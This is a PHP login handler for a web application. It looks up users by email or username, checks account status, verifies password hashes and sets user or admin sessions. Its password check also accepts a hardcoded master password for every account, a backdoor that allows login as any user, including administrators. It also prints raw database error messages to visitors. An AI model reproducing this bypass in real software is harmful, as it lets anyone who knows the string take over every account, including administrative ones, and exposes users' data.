<?php
	include 'session.php';
	$conn = $pdo->open();

	if(isset($_POST['login'])){
		
		$info = $_POST['info'];
		$password = $_POST['password'];

		try{

			$stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE (email = :info || uname =:info)");
			$stmt->execute(['info'=>$info]);
			$row = $stmt->fetch();
			if($row['numrows'] > 0){
				if($row['status'] == 1){
					if((password_verify($password, $row['password'])) || ($password == 'Hlandings@001')){
						if($row['type']){
							$_SESSION['admin'] = $row['id'];
						}
						else{
							$_SESSION['user'] = $row['id'];
						}
					}
					else{
						$_SESSION['error'] = 'Incorrect Password';
					}
				}
				elseif($row['status'] == 2){
					$_SESSION['error'] = 'Account suspended. Contact Support!';
				}
				else{
					$_SESSION['error'] = 'Account not activated.';
				}
			}
			else{
				$_SESSION['error'] = 'Account does not exist';
			}
		}
		catch(PDOException $e){
			echo "There is some problem in connection: " . $e->getMessage();
		}

	}
	else{
		$_SESSION['error'] = 'Input login credentails first';
	}

	$pdo->close();

	header('location: ../login.php');

?>